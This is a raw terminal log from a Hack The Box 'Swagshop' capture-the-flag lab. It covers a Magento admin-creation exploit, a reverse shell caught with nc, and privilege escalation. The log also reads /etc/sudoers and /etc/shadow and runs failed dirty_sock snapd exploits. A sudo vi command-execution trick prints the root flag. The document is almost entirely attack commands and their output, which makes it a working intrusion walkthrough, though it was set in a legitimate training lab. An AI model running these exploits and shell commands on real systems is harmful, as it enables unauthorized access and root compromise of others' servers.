@@ -1,0 +1,287 @@
+(Magento Connect Manager ver. 1.9.0.0)
+
+root@kali:~/HTB/Swagshop# python 37977.py
+WORKED
+Check http://swagshop.htb/downloader/index.php?A=loggedin/admin with creds forme:forme
+root@kali:~/HTB/Swagshop# 
+
+Upload shell to index.php
+
+root@kali:~/HTB/Swagshop# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.92] from swagshop.htb [10.10.10.140] 35708
+Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 06:55:28 up 11 min,  0 users,  load average: 5.43, 6.35, 3.69
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls -a
+.
+..
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ locate user.txt
+$ cd home
+$ ls -a
+.
+..
+haris
+$ cd haris
+$ ls -a
+.
+..
+.Xauthority
+.bash_history
+.bash_logout
+.bashrc
+.cache
+.mysql_history
+.profile
+.sudo_as_admin_successful
+user.txt
+$ cat user.txt
+a448877277e82f05e5ddf9f90aefbac8
+$ 
+
+$ whoami
+www-data
+$ env
+OLDPWD=/home
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/home/haris
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+$ cat /etc/sudoers
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+
+www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*
+$ cat /etc/shadow
+
+$ visudo
+visudo: /etc/sudoers: Permission denied
+$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+$ 
+$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+$ find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/umount
+/bin/fusermount
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/at
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/chsh
+$ 
+
+$ snap --version
+snap    2.38
+snapd   2.38
+series  16
+ubuntu  16.04
+kernel  4.4.0-146-generic
+$ 
+
+$ awk 'BEGIN {system("sudo vi")}'
+sudo: no tty present and no askpass program specified
+$ 
+$ python3 -c "import pty; pty.spawn('/bin/sh');"
+$ sudo vi
+sudo vi
+[sudo] password for www-data: 
+
+
+$ python3 dirty_sockv2.py
+python3 dirty_sockv2.py
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      |  \ | |__/  |   \_/      [__  |  | |    |_/  
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/fhbshuubkj;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[!] System may not be vulnerable, here is the API reply:
+
+
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Wed, 29 May 2019 12:38:51 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
+
+
+$ python3 dirty_sockv1.py -u 0xskywalk3r@sharklasers.com -k id_rsa
+python3 dirty_sockv1.py -u 0xskywalk3r@sharklasers.com -k id_rsa
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      |  \ | |__/  |   \_/      [__  |  | |    |_/  
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
+                       (version 1)
+
+//=========[]==========================================\\
+|| R&D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/nzcmewpnqn;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Sending payload...
+[!] System may not be vulnerable, here is the API reply:
+
+
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Wed, 29 May 2019 12:44:32 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
+$ 
+
+
+SINCE WE CAN EDIT LICENCE.HTML AS SUDO WITH VI, USING THE VI CVE-2019-12735 TO GET RCE AS ROOT
+
+$ cd /var/www/html/*
+cd /var/www/html/*
+/bin/sh: 14: cd: can't cd to /var/www/html/LICENSE.html
+$ sudo /usr/bin/vi /var/www/html/LICENSE.html
+sudo /usr/bin/vi /var/www/html/LICENSE.html
+
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to 'ansi'
+
+<h4>Open Software License ("OSL") v. 3.0</h4>
+
+<p>This Open Software License (the "License") applies to any original work of au
+thorship (the "Original Work") whose owner (the "Licensor") has placed the follo
+wing licensing notice adjacent to the copyright notice for the Original Work:</p
+:!cat /root/root.txt||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+^[[ALicensed under the Open Software License version 3.0</h5>
+<p>Grant of Copyright License. Licensor grants You a worldwide, royalty-free, no
+n-exclusive, sublicensable license, for the duration of the copyright, to do the
+ following:</p>
+<ul class="disc">
+    <li>to reproduce the Original Work in copies, either alone or as part of a c
+ollective work</li>
+    <li>to translate, adapt, alter, transform, modify, or arrange the Original W
+ork, thereby creating derivative works ("Derivative Works") based upon the Origi
+nal Work</li>l/LICENSE.html" 42L, 10679C
+    <li>to distribute or communicate copies of the Original Work and Derivative
+ware License</li>istribute or communicate shall be licensed under this Open Soft
+    <li>to perform the Original Work publicly</li>
+    <li>to display the Original Work publicly</li>
+:!cat /root/root.txt||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+c2b087d66e14a652a3b86a130ac56721
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+
